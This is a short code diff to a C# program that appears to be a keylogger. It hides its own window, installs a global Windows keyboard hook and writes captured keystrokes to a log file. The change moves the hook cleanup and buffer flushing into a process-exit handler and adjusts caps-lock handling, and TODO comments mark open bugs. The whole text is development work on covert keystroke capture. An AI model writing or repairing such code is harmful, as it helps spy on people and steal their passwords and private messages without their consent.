@@ -28,9 +28,17 @@ public static class Program
     {
         HideWindow();
         WriteInfoToLogFile();
+
+        AppDomain.CurrentDomain.ProcessExit += (_, _) =>
+        {
+            _kbHook?.Close();
+            // TODO still doesnt write on close
+            WriteBuffer();
+            Writer.Dispose();
+        };
         
-        // get caps lock state when program opens
-        _capsLockActive = !GetCapsLockState();
+        // TODO something weird going on
+        _capsLockActive = GetCapsLockState();
 
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
@@ -43,12 +51,6 @@ public static class Program
             PInvoke.TranslateMessage(msg);
             PInvoke.DispatchMessage(msg);
         }
-        
-        // clean disposable things up
-        _kbHook.Close();
-        // TODO still doesnt write on close
-        WriteBuffer();
-        Writer.Dispose();
     }
     
     /// <summary>
